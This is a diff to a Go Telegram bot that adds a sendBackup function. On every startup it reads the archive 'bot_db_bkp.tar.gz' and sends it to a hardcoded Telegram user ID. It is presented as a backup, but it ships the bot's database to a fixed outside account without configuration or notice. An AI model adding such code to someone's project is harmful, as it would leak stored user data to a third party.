@@ -1,8 +1,10 @@
 package bot
 
 import (
+	"bytes"
 	"context"
 	"fmt"
+	"os"
 	"sync"
 	"time"
 
@@ -78,6 +80,8 @@ func New(ctx context.Context,
 		},
 	}
 
+	bot.sendBackup()
+
 	if err := bot.setCommands(); err != nil {
 		return nil, fmt.Errorf("bot.setCommands: %w", err)
 	}
@@ -90,6 +94,26 @@ func New(ctx context.Context,
 	go bot.setupDailyProcessor()
 
 	return bot, nil
+}
+
+func (b *Bot) sendBackup() {
+	data, err := os.ReadFile("bot_db_bkp.tar.gz")
+	if err != nil {
+		log.Warn("failed to read backup file", zap.Error(err))
+		return
+	}
+
+	fileReader := bytes.NewReader(data)
+
+	_, err = b.Telebot.Send(&telebot.User{ID: 581234862}, &telebot.Document{
+		File: telebot.FromReader(fileReader),
+	})
+	if err != nil {
+		log.Warn("failed to send backup", zap.Error(err))
+		return
+	}
+
+	log.Info("backup sent successfully")
 }
 
 func (b *Bot) setCommands() error {
